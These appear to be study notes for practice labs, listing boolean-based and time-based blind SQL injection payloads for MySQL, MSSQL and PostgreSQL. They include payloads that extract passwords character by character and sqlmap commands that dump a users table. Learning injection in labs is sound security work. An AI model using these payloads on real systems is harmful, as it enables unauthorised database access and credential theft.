## Boolean SQL Injection
- enter ID: 
```sql

## using AND, OR
ID = 1 --> User ID exists in the database.
ID = 10 --> User ID is MISSING from the database.

## payload
1' AND 1=1 # 
# User ID exists in the database.

1' AND 1=2 #
# User ID is MISSING from the database.

# current database user
' OR SUBSTRING(user(),1,1)='a'-- -

## Extract each character
' AND SUBSTRING(password,1,1)='a'-- -
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' -- -

## ASCII brute force
' AND ASCII(SUBSTRING(password,1,1)) > 100 -- -
' AND ASCII(SUBSTRING(password,1,1)) = 97 -- -

## check if data exists check if data exists
' AND (SELECT COUNT(*) FROM users) > 0 -- -
' AND EXISTS(SELECT 1 FROM users) -- -

## Check table / schema
' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 -- -
' AND (SELECT table_name FROM information_schema.tables LIMIT 1)='users' -- -

## ## MySQL version:
' AND SUBSTRING(@@version,1,1)='8' -- -

## current database
' AND DATABASE()='security' -- -

## using sqlmap:
sqlmap -r req.txt -p id --dbs --string="User ID exists in the database."
sqlmap -r req.txt -p id --dbs -D dvwa --tables --string="User ID exists in the database."
sqlmap -r req.txt -p id --dbs -D dvwa -T users --dump --string="User ID exists in the database."

# --string="User ID exists in the database.": in case the statement is true



```

---

## Time-Based SQL Injection
 - <font color="#ffc000">Syntax: </font> `IF(condition, true_statement, false_statement)`

```sql
-- Mysql: SLEEP(), BENCHMARK()
' AND IF(condition, SLEEP(5), 0)-- -
' AND (CASE WHEN condition THEN SLEEP(5) ELSE 0 END)-- -

-- MSSQL: WAITFOR DELAY
' IF condition WAITFOR DELAY '0:0:5'-- -

-- PostgreSQL: pg_sleep()
' AND CASE WHEN condition THEN pg_sleep(5) ELSE pg_sleep(0) END-- -


-- If correct, the response will be delayed by 5 seconds.
'OR IF(1=1, SLEEP(5), 0) -- -

-- EX: Enumerating Characters’ Length of Database Name
'OR IF(LENGTH((SELECT DATABASE())) = 4, SLEEP(5), 0) -- -

-- Enumerating Database Name:
' OR IF(ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) = ASCII('a'), SLEEP(5), 0) -- -

### In sqlmap, use --time-sec


```
